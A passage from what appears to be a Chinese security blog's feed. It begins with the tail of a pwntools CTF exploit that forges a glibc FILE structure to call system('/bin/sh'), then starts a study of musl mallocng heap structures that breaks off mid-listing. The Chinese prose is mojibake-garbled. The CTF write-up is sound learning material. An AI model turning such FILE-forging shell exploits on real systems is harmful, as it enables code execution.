class="title function_">fread</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fwrite</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vuln_exit</span>(<span class="params">name</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line">addr_fake_file = elf.sym[<span class="string">&quot;name&quot;</span>]</span><br><span class="line">addr_fp = elf.sym[<span class="string">&quot;fp&quot;</span>]</span><br><span class="line">offset_fp = addr_fp - addr_fake_file</span><br><span class="line">offset_lock = <span class="number">0x48</span> <span class="comment"># fake_file + _</span></span><br><span class="line">offset_vtable = <span class="number">0x94</span> <span class="comment"># fake_file + _</span></span><br><span class="line">offset_call = <span class="number">0x44</span> <span class="comment"># addr_vtable + _</span></span><br><span class="line"></span><br><span class="line">fopen(<span class="string">&quot;/proc/self/maps&quot;</span>)</span><br><span class="line">fread()</span><br><span class="line">fwrite()</span><br><span class="line">fread()</span><br><span class="line">fwrite()</span><br><span class="line">p.recvuntil(<span class="string">&quot;[heap]\n&quot;</span>)</span><br><span class="line"><span class="comment"># addr_libc = int(p.recv(8), 16)</span></span><br><span class="line">addr_libc = <span class="built_in">int</span>(p.recv(<span class="number">8</span>), <span class="number">16</span>) + <span class="number">0x1000</span></span><br><span class="line"><span class="comment"># info(&quot;libc addr =&gt; &quot; + hex(addr_libc))</span></span><br><span class="line">addr_system = addr_libc + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">b&quot;/bin/sh\x00&quot;</span> + p32(addr_system) * <span class="number">6</span></span><br><span class="line">payload = (fake_file).ljust(offset_fp, <span class="string">b&quot;\x00&quot;</span>) + p32(addr_fake_file)</span><br><span class="line">payload = (payload).ljust(offset_lock, <span class="string">b&quot;\x00&quot;</span>) + p32(addr_fake_file + offset_vtable + <span class="number">4</span>)</span><br><span class="line">payload = (payload).ljust(offset_vtable, <span class="string">b&quot;\x00&quot;</span>) + p32(addr_fake_file + <span class="number">8</span> - offset_call)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *0x8048b0f&quot;)</span></span><br><span class="line"></span><br><span class="line">vuln_exit(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;ç³»ç»Ÿåœ°å­¦ä¸€ä¸‹ glibc æ–‡ä»¶ç»“æ„çš„æ´&lt;/p&gt;</summary>
    
    
    
    <category term="Exploration" scheme="https://humoooor.cn/categories/Exploration/"/>
    
    
    <category term="Pwn" scheme="https://humoooor.cn/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Musl heap æµ…æ</title>
    <link href="https://humoooor.cn/2022/10/10/Musl%20heap%20%E6%B5%85%E6%9E%90/"/>
    <id>https://humoooor.cn/2022/10/10/Musl%20heap%20%E6%B5%85%E6%9E%90/</id>
    <published>2022-10-10T08:26:00.000Z</published>
    <updated>2023-03-31T08:10:43.582Z</updated>
    
    <content type="html"><![CDATA[<p>æµ…æµ…åˆ†æä¸€ä¸‹</p><span id="more"></span><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç¯å¢ƒï¼šx64 musl-1.2.2</p><p>ç¬”è€…åªæµ…æµ…åˆ†æäº† malloc å’Œ free çš„æºç ï¼Œå¯¹ç›¸å…³ç»“æ„æ²¡æœ‰è¯¦ç»†ä»‹ç»ï¼Œå¯é…åˆ xf1les å¸ˆå‚…çš„<a href="https://blog.xf1les.net/2021/11/03/mallocng-part-one/">æ–‡ç« </a>é£Ÿç”¨</p><h2 id="ç›¸å…³ç»“æ„"><a href="#ç›¸å…³ç»“æ„" class="headerlink" title="ç›¸å…³ç»“æ„"></a>ç›¸å…³ç»“æ„</h2><h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><p>å®é™…ä¸Šæºç å¹¶æ²¡æœ‰ chunk ç»“æ„ä½“å®šä¹‰ï¼Œä¸‹é¢æ˜¯é€šè¿‡ malloc æ¨æµ‹å‡ºæ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> prev_data[<span class="number">4</span>];</span><br><span class="line">    <span class="type">uint8_t</span> idx:<span class="number">5</span>;  <span class="comment">// group çš„ç¬¬å‡ ä¸ª chunkï¼Œä» 0 å¼€å§‹</span></span><br><span class="line">    <span class="type">uint8_t</span> reserved:<span class="number">3</span>; <span class="comment">// chunk æ²¡æœ‰ç”¨åˆ°çš„ç©ºé—´å¤§å°ï¼Œè‹¥ reserved = 5ï¼Œé‚£ä¹ˆä¼šåœ¨ä¸‹ä¸€ä¸ª chunk çš„ prev_data ä¸­è®°å½•çœŸå®çš„ reserved</span></span><br><span class="line">    <span class="type">uint16_t</span> offset; <span class="comment">// ç›¸å¯¹äºç¬¬ä¸€ä¸ª chunk çš„åç§»ï¼Œå®é™…åœ°å€åç§»ä¸º offset * 0x10</span></span><br><span class="line">    <span class="type">char</span> data[]; <span class="comment">// ç”¨æˆ·æ•°æ®</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><strong>prev_data</strong><ul><li>ç©ºé—´å¤ç”¨ï¼Œå‰ä¸€ä¸ª chunk å¯ä»¥å¤šä½¿ç”¨ 4 ä¸ªå­—èŠ‚</li></ul></li><li><strong>idx</strong><ul><li>group çš„ç¬¬å‡ ä¸ª chunkï¼Œä» 0 å¼€å§‹</li></ul></li><li><strong>reserved</strong><ul><li>chunk æ²¡æœ‰ç”¨åˆ°çš„ç©ºé—´å¤§å°</li><li>è‹¥ reserved == 5ï¼Œé‚£ä¹ˆä¼šåœ¨ä¸‹ä¸€ä¸ª chunk çš„ prev_data ä¸­è®°å½•çœŸå®çš„ reserved</li></ul></li><li><strong>offset</strong><ul><li>ç›¸å¯¹äºç¬¬ä¸€ä¸ª chunk çš„åç§»ï¼Œå®é™…åœ°å€åç§»ä¸º offset * 0x10</li></ul></li></ul><p>ç”±äºå†…å­˜å¯¹é½ï¼Œæ¯ä¸ª chunk å¯ä»¥ä½¿ç”¨ä¸‹ä¸€ä¸ª chunk çš„ 4 å­—èŠ‚ç©ºé—´</p><p>ï¼ˆæ¯ä¸ª group çš„ç¬¬ä¸€ä¸ª chunk å‰é¢æœ‰ 0x10 ä¸ªå­—èŠ‚ = group + chunk_headerï¼‰</p><h4 id="inuse-chunk"><a href="#inuse-chunk" class="headerlink" title="inuse_chunk"></a>inuse_chunk</h4><p>avail_mask å’Œ freed_mask å¯¹åº”çš„ä½ç½®éƒ½ä¸º 0</p><h4 id="unuse-chunk"><a href="#unuse-chunk" class="headerlink" title="unuse_chunk"></a>unuse_chunk</h4><ul><li><p><strong>avail_chunk</strong></p><ul><li>å†…å®¹ä¸€èˆ¬ä¸ºç©º</li><li>avail_mask ä¸Š idx å¯¹åº”çš„ä½ç½®ä¸º 1</li></ul></li><li><p><strong>freed_chunk</strong></p><ul><li>idx å’Œ reserved ç½®ä¸º 0xffï¼Œoffset ç½®é›¶</li><li>freed_mask ä¸Š idx å¯¹åº”çš„ä½ç½®ä¸º 1</li></ul></li></ul><h3 id="group"><a href="#group" class="headerlink" title="group"></a>group</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/meta.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> UNIT 16</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span><span class="comment">// å¯¹åº”çš„ meta åœ°å€</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> active_idx:<span class="number">5</span>;<span class="comment">// last_chunk_idx</span></span><br><span class="line">    <span class="type">char</span> pad[UNIT - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];   <span class="comment">// alien</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> storage[];<span class="comment">// chunks</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ç”± meta ç®¡ç†ï¼Œä½äºå¯æ‰§è¡Œæ–‡ä»¶çš„æ•°æ®æ®µ</p><ul><li><strong>meta</strong><ul><li>å¯¹åº”çš„ meta åœ°å€</li></ul></li><li><strong>active_idx</strong><ul><li>å¯ç”¨çš„ chunk çš„æœ€å¤§ idx</li></ul></li><li><strong>pad</strong><ul><li>å¡«å……ä½ï¼Œç”¨äºå¯¹é½</li></ul></li><li><strong>storage</strong><ul><li>å­˜å‚¨æ•°æ®ï¼Œchunks</li></ul></li></ul><h3 id="meta"><a href="#meta" class="headerlink" title="meta"></a>meta</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/meta.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span><span class="comment">// åŒç±»å‹ä¸”å¯åˆ†é… chunk çš„ meta æˆ– freed_meta ä»¥åŒå‘é“¾è¡¨çš„å½¢å¼è¿æ¥</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span><span class="comment">// æŒ‡å‘å¯¹åº”çš„ group åœ°å€</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;  <span class="comment">// ä»¥ä½å›¾æ–¹å¼è¡¨ç¤º group ä¸­ chunk çŠ¶æ€</span></span><br><span class="line">    <span class="type">uintptr_t</span> last_idx:<span class="number">5</span>;<span class="comment">// group ä¸­ chunk æ•°é‡</span></span><br><span class="line">    <span class="type">uintptr_t</span> freeable:<span class="number">1</span>;<span class="comment">// meta æ˜¯å¦å¯ä»¥è¢«å›æ”¶ï¼Œ1 è¡¨ç¤ºå¯ä»¥</span></span><br><span class="line">    <span class="type">uintptr_t</span> sizeclass:<span class="number">6</span>;<span class="comment">// ä½œä¸º size_classes çš„ä¸‹æ ‡ï¼Œä¸ºè¯¥ group ä¸­æ¯ä¸ª chunk å¤§å°ï¼ˆByteï¼‰</span></span><br><span class="line">    <span class="type">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="type">uintptr_t</span>)<span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><strong>prev</strong>ï¼Œ<strong>next</strong><ul><li>åŒç±»å‹ä¸”å¯åˆ†é… chunk çš„ meta æˆ– freed_meta ä»¥åŒå‘é“¾è¡¨çš„å½¢å¼è¿æ¥</li></ul></li><li><strong>mem</strong><ul><li>æŒ‡å‘å¯¹åº”çš„ group åœ°å€</li></ul></li><li><strong>avail_mask</strong>ï¼Œ<strong>freed_mask</strong><ul><li>ä»¥ä½å›¾æ–¹å¼è¡¨ç¤º group ä¸­ chunk çŠ¶æ€ï¼Œå› æ­¤ä¸€ä¸ª group æœ€å¤šèƒ½æœ‰ 32 ä¸ª chunk</li><li>0 è¡¨ç¤º inuseï¼Œ1 è¡¨ç¤º avail æˆ– freed</li><li>chunk åˆ†ä¸º inuse_chunkã€avail_chunkã€freed_chunk ä¸‰ä¸ªçŠ¶æ€</li></ul></li><li><strong>last_idx</strong><ul><li>group ä¸­ chunk æ•°é‡</li></ul></li><li><strong>freeable</strong><ul><li>meta æ˜¯å¦å¯ä»¥è¢«å›æ”¶ï¼Œ1 è¡¨ç¤ºå¯ä»¥</li></ul></li><li><strong>sizeclass</strong><ul><li>ä½œä¸º size_classes çš„ä¸‹æ ‡ï¼Œä¸ºè¯¥ group ä¸­æ¯ä¸ª chunk å¤§å°ï¼ˆByteï¼‰</li></ul></li></ul><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/malloc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">uint16_t</span> size_classes[] = &#123;</span><br><span class="line"><span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>,</span><br><span class="line"><span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">15</span>,</span><br><span class="line"><span class="number">18</span>, <span class="number">20</span>, <span class="number">25</span>, <span class="number">31</span>,</span><br><span class="line"><span class="number">36</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">63</span>,</span><br><span class="line"><span class="number">72</span>, <span class="number">84</span>, <span class="number">102</span>, <span class="number">127</span>,</span><br><span class="line"><span class="number">146</span>, <span class="number">170</span>, <span class="number">204</span>, <span class="number">255</span>,</span><br><span class="line"><span class="number">292</span>, <span class="number">340</span>, <span class="number">409</span>, <span class="number">511</span>,</span><br><span class="line"><span class="number">584</span>, <span class="number">682</span>, <span class="number">818</span>, <span class="number">1023</span>,</span><br><span class="line"><span class="number">1169</span>, <span class="number">1364</span>, <span class="number">1637</span>, <span class="number">2047</span>,</span><br><span class="line"><span class="number">2340</span>, <span class="number">2730</span>, <span class="number">3276</span>, <span class="number">4095</span>,</span><br><span class="line"><span class="number">4680</span>, <span class="number">5460</span>, <span class="number">6552</span>, <span class="number">8191</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><strong>maplen</strong><ul><li>è‹¥ group æ˜¯ mmap åˆ†é…çš„ç©ºé—´ï¼Œä¸ºå¯¹åº”çš„é•¿åº¦ï¼Œå…¶ä»–æƒ…å†µä¸º 0</li></ul></li></ul><h4 id="avail-meta"><a href="#avail-meta" class="headerlink" title="avail_meta"></a>avail_meta</h4><p>åœ¨ meta_area ä¸­æŒ‰é¡ºåºå–å‡ºï¼Œavail_meta = {0}</p><h4 id="freed-meta"><a href="#freed-meta" class="headerlink" title="freed_meta"></a>freed_meta</h4><ul><li>FIFOï¼Œmalloc_context ä¸­ freed_meta_head æŒ‡å‘ç¬¬ä¸€ä¸ª freed_meta</li><li>meta-&gt;mem-&gt;meta = 0</li><li>freed_meta = {0}</li></ul><h3 id="meta-area"><a href="#meta-area" class="headerlink" title="meta_area"></a>meta_area</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/meta.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line"><span class="type">uint64_t</span> check;<span class="comment">// ä¸ malloc_context ä¸­çš„ secret ç›¸ç­‰ï¼Œé˜²æ­¢ä¼ªé€  meta</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span><span class="comment">// ä¸‹ä¸€ä¸ª meta_area çš„åœ°å€</span></span><br><span class="line"><span class="type">int</span> nslots;<span class="comment">// meta æ§½çš„æ•°é‡</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span><span class="comment">// metas</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä»¥é¡µä¸ºå•ä½åˆ†é…ï¼Œæ˜¯å¤šä¸ª meta çš„é›†åˆï¼Œå› æ­¤ <code>meta_area_addr = meta_addr &amp; 0xfffffffffffff000</code></p><ul><li><strong>check</strong><ul><li>ä¸ malloc_context ä¸­çš„ secret ç›¸ç­‰ï¼Œé˜²æ­¢ä¼ªé€  meta</li></ul></li><li><strong>next</strong><ul><li>ä¸‹ä¸€ä¸ª meta_area çš„åœ°å€</li></ul></li><li><strong>nslots</strong><ul><li>meta æ§½çš„æ•°é‡</li><li>æ³¨ï¼šåœ¨ musl ä¸­ slot å¯èƒ½æŒ‡ meta ä¹Ÿå¯èƒ½æŒ‡ chunk</li></ul></li><li><strong>slots</strong><ul><li>å­˜æ”¾å¤šä¸ª meta ç»“æ„ä½“ï¼Œmetas</li></ul></li></ul><h3 id="malloc-context"><a href="#malloc-context" class="headerlink" title="malloc_context"></a>malloc_context</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/meta.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line"><span class="type">uint64_t</span> secret;<span class="comment">// é˜²æ­¢ä¼ªé€  meta</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGESIZE</span></span><br><span class="line"><span class="type">size_t</span> pagesize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">int</span> init_done;<span class="comment">// æ˜¯å¦åˆå§‹åŒ–çš„æ ‡è®°</span></span><br><span class="line"><span class="type">unsigned</span> mmap_counter;<span class="comment">// è®°å½• mmap å‡ºæ¥çš„ chunk çš„æ•°é‡</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span><span class="comment">// æŒ‡å‘ freed_meta å¤´</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span><span class="comment">// æŒ‡å‘ area_areas ä¸­å¯åˆ†é… meta ç©ºé—´</span></span><br><span class="line"><span class="type">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span> <span class="comment">// åˆ†åˆ«æŒ‡å‘ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ª meta_area</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *avail_meta_areas;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span><span class="comment">// å¯ä»¥åˆ†é…çš„ meta åœ°å€ï¼Œidx å¯¹åº”ç€ size_classes çš„å¤§å°ï¼Œç±»ä¼¼ glibc çš„ bins</span></span><br><span class="line"><span class="type">size_t</span> usage_by_class[<span class="number">48</span>];<span class="comment">// idx å¯¹åº”å¤§å°çš„æ‰€æœ‰ meta çš„ chunk æ•°é‡</span></span><br><span class="line"><span class="type">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line"><span class="type">uint8_t</span> seq;</span><br><span class="line"><span class="type">uintptr_t</span> brk;<span class="comment">// è®°å½•ç›®å‰çš„ brk(0)</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä½äº libc çš„æ•°æ®æ®µï¼Œä¸ºå…¨å±€ç»“æ„ä½“</p><ul><li><strong>secret</strong><ul><li>é˜²æ­¢ä¼ªé€  meta</li></ul></li><li><strong>free_meta_head</strong><ul><li>æŒ‡å‘ freed_meta å¤´</li></ul></li><li><strong>avail_meta</strong><ul><li>æŒ‡å‘å¯ç”¨ meta æ•°ç»„</li></ul></li><li><strong>active</strong><ul><li>æŒ‡å‘ä¸€ä¸ª meta åŒå‘é“¾è¡¨ï¼Œå…¶ä¸­çš„ meta ä¸€èˆ¬éƒ½æœ‰ unuse_chunk</li><li>idx å¯¹åº”ç€ size_classes çš„å¤§å°ï¼Œç±»ä¼¼ glibc çš„ bins</li><li>æŒ‡å‘çš„ç¬¬ä¸€ä¸ª meta ä¸€èˆ¬æœ‰ avail_chunkï¼Œåé¢çš„ meta ä¸€èˆ¬åªæœ‰ freed_chunk</li></ul></li><li><strong>usage_by_class</strong><ul><li>idx å¯¹åº”å¤§å°çš„æ‰€æœ‰ meta çš„ group ç®¡ç†çš„ chunk æ•°é‡</li></ul></li><li><strong>brk</strong><ul><li>è®°å½•ç›®å‰çš„ brk(0)</li></ul></li></ul><h3 id="chunk-gt-meta"><a href="#chunk-gt-meta" class="headerlink" title="chunk -&gt; meta"></a>chunk -&gt; meta</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/meta.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> meta *<span class="title function_">get_meta</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">assert(!((<span class="type">uintptr_t</span>)p &amp; <span class="number">15</span>));</span><br><span class="line"><span class="type">int</span> offset = *(<span class="type">const</span> <span class="type">uint16_t</span> *)(p - <span class="number">2</span>);</span><br><span class="line"><span class="type">int</span> index = get_slot_index(p);</span><br><span class="line"><span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">assert(!offset);</span><br><span class="line">offset = *(<span class="type">uint32_t</span> *)(p - <span class="number">8</span>);</span><br><span class="line">assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="type">const</span> <span class="type">void</span> *)(p - UNIT*offset - UNIT);</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  check */</span></span><br><span class="line">assert(meta-&gt;mem == base);</span><br><span class="line">assert(index &lt;= meta-&gt;last_idx);</span><br><span class="line">assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="type">void</span> *)((<span class="type">uintptr_t</span>)meta &amp; <span class="number">-4096</span>);</span><br><span class="line">assert(area-&gt;check == ctx.secret);</span><br><span class="line"><span class="keyword">if</span> (meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123;</span><br><span class="line">assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);</span><br><span class="line">assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+<span class="number">1</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">assert(offset &lt;= meta-&gt;maplen*<span class="number">4096UL</span>/UNIT - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* end */</span></span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">struct</span> meta *)meta;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>å– chunk çš„ idx å’Œ offset</li><li>é€šè¿‡ offset å– group</li><li>é€šè¿‡ group-&gt;meta å– meta</li><li>å„ç§æ£€æŸ¥<ul><li>meta-&gt;mem == group</li><li>idx &lt;= meta-&gt;last_idx</li><li>meta çš„ mask ä¸Š idx å¯¹åº”çš„ä½ç½®æ˜¯å¦éƒ½ä¸º 0</li><li>meta_area-&gt;check == malloc_context.secret</li><li>size_classes[meta-&gt;sizeclass]*(index) &lt;= offset &lt; size_classes[meta-&gt;sizeclass]*(index+1)</li></ul></li></ol><h3 id="å¤§æ¦‚æ€»ç»“ä¸€ä¸‹"><a href="#å¤§æ¦‚æ€»ç»“ä¸€ä¸‹" class="headerlink" title="å¤§æ¦‚æ€»ç»“ä¸€ä¸‹"></a>å¤§æ¦‚æ€»ç»“ä¸€ä¸‹</h3><ul><li>malloc_context ä½œä¸ºå…¨å±€å˜é‡ï¼Œåœ¨ libc æ•°æ®æ®µ</li><li>meta_area ä½œä¸º meta çš„é›†åˆï¼Œç®¡ç†ç€ meta</li><li><strong>åŒç±»å‹</strong> ä¸” <strong>æœ‰å¯åˆ†é… chunk</strong> çš„ meta ä»¥åŒå‘é“¾è¡¨å½¢å¼è¿æ¥èµ·æ¥ï¼Œå¦‚æœ meta çš„ chunk å…¨éƒ¨åˆ†é…å‡ºå»ï¼Œåˆ™ä¼šä»åŒå‘é“¾è¡¨ä¸­ç§»å‡º</li><li>malloc æ—¶ï¼Œé€šè¿‡ malloc_context çš„ active å¯»æ‰¾å¯¹åº”å¤§å°çš„å¯ä½¿ç”¨çš„ metaï¼Œç±»ä¼¼ glibc çš„ bins<ul><li>malloc_context çš„ active æŒ‡å‘çš„ç¬¬ä¸€ä¸ª meta ä¸€èˆ¬æ˜¯æœ‰ avail_chunk æˆ–è€… freed_chunkï¼ˆæˆ–æ‰€æœ‰ chunk åˆšå¥½åˆ†é…å®Œï¼‰ï¼Œæ­¤ meta åé¢çš„ meta ä¸€èˆ¬åªæœ‰ freed_chunk</li><li>malloc_context çš„ freed_meta_head æŒ‡å‘ freed_meta é“¾è¡¨</li></ul></li></ul><p><img src="/img/Musl_heap_%E6%B5%85%E6%9E%90.assets/Musl_heap_structure.png" alt="Musl heap structure"></p><h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><h3 id="malloc-1"><a href="#malloc-1" class="headerlink" title="malloc"></a>malloc</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/malloc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span 